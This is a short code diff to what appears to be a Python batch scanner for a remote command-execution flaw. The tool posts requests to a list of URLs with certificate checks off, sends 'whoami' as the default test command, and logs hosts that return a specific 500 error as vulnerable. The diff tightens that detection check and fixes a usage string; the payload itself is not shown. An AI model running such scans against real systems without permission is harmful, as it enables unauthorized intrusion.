@@ -43,7 +43,10 @@ def scan(txt,cmd):
         try:
             req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
             code =req.status_code
-            if code == 500:
+            text = req.text
+            rsp = '"error":"Internal Server Error"'
+
+            if code == 500 and rsp in text:
                 print(f'[+]{url} 存在漏洞')
                 poc_file = open('succ.txt', 'a+')
                 poc_file.write(url + '\n')
@@ -66,6 +69,6 @@ if __name__ == '__main__' :
         t=threading.Thread(target=scan(cmd1,'whoami') )#默认使用whoami进行批量检测
         t.start()
     except:
-        print('用法')
+        print('用法：')
         print('python demo.py url.txt')
         pass
